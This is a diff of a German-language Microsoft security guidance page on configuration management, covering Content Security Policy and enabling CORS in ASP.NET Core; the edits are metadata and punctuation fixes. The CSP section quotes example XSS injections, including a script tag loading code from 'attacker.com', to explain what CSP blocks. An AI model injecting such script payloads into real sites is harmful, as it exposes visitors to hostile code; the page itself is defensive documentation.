@@ -18,10 +18,10 @@ ms.date: 02/07/2017
 ms.author: jegeib
 ms.custom: devx-track-js, devx-track-csharp
 ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
-ms.sourcegitcommit: 5831eebdecaa68c3e006069b3a00f724bea0875a
+ms.sourcegitcommit: 867cb1b7a1f3a1f0b427282c648d411d0ca4f81f
 ms.translationtype: HT
 ms.contentlocale: de-DE
-ms.lasthandoff: 11/11/2020
+ms.lasthandoff: 03/19/2021
 ms.locfileid: "94517483"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Sicherheitsrahmen: Konfigurationsverwaltung | Risikominderung 
@@ -46,7 +46,7 @@ ms.locfileid: "94517483"
 | **Zutreffende Technologien** | Allgemein |
 | **Attribute**              | –  |
 | **Referenzen**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Eine Einführung in die Inhaltssicherheitsrichtlinie), [Content Security Policy Reference](https://content-security-policy.com/) (Referenz für die Inhaltssicherheitsrichtlinie), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Sicherheitsfeatures), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Einführung in die Inhaltssicherheitsrichtlinie), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (Kann ich die Inhaltssicherheitsrichtlinie verwenden?) |
-| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Zulassungsliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS** :  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert aufgrund der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src="http://attacker.com/maliciousCode.js"/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Liste der zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten** : Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Dies liegt daran, dass die Zieldomäne nicht in der CSP-Zulassungsliste enthalten ist.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen** : Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |
+| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Zulassungsliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS**:  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert aufgrund der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src="http://attacker.com/maliciousCode.js"/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Liste der zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten**: Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Dies liegt daran, dass die Zieldomäne nicht in der CSP-Zulassungsliste enthalten ist.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen**: Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |
 
 ### <a name="example"></a>Beispiel
 Beispielrichtlinie: 
@@ -399,7 +399,7 @@ public class ResourcesController : ApiController
 | **Referenzen**              | [Enabling Cross-Origin Requests (CORS) in ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) (Aktivieren von CORS in ASP.NET Core 1.0) |
 | **Schritte** | <p>In ASP.NET Core 1.0 kann CORS entweder mithilfe von Middleware oder mithilfe von MVC aktiviert werden. Bei Verwendung von MVC werden die gleichen CORS-Dienste verwendet, aber nicht die CORS-Middleware.</p>|
 
-**Vorgehensweise 1** : Aktivieren von CORS mithilfe von Middleware: Wenn Sie CORS für die gesamte Anwendung aktivieren möchten, fügen Sie die CORS-Middleware mithilfe der UseCors-Erweiterungsmethode der Anforderungspipeline hinzu. Beim Hinzufügen der CORS-Middleware kann mithilfe der CorsPolicyBuilder-Klasse eine ursprungsübergreifende Richtlinie angegeben werden. Hierfür gibt es zwei Möglichkeiten:
+**Vorgehensweise 1**: Aktivieren von CORS mithilfe von Middleware: Wenn Sie CORS für die gesamte Anwendung aktivieren möchten, fügen Sie die CORS-Middleware mithilfe der UseCors-Erweiterungsmethode der Anforderungspipeline hinzu. Beim Hinzufügen der CORS-Middleware kann mithilfe der CorsPolicyBuilder-Klasse eine ursprungsübergreifende Richtlinie angegeben werden. Hierfür gibt es zwei Möglichkeiten:
 
 ### <a name="example"></a>Beispiel
 Das erste Beispiel dient zum Aufrufen von „UseCors“ mit einem Lambda. Das Lambda akzeptiert ein CorsPolicyBuilder-Objekt: 
@@ -434,7 +434,7 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Vorgehensweise 2** : Aktivieren von CORS in MVC: Entwickler können alternativ MVC verwenden, um bestimmte CORS pro Aktion, pro Controller oder global für alle Controller anzuwenden.
+**Vorgehensweise 2**: Aktivieren von CORS in MVC: Entwickler können alternativ MVC verwenden, um bestimmte CORS pro Aktion, pro Controller oder global für alle Controller anzuwenden.
 
 ### <a name="example"></a>Beispiel
 Pro Aktion: Fügen Sie einer Aktion das EnableCors-Attribut hinzu, um eine CORS-Richtlinie für eine bestimmte Aktion anzugeben. Geben Sie den Namen der Richtlinie an. 
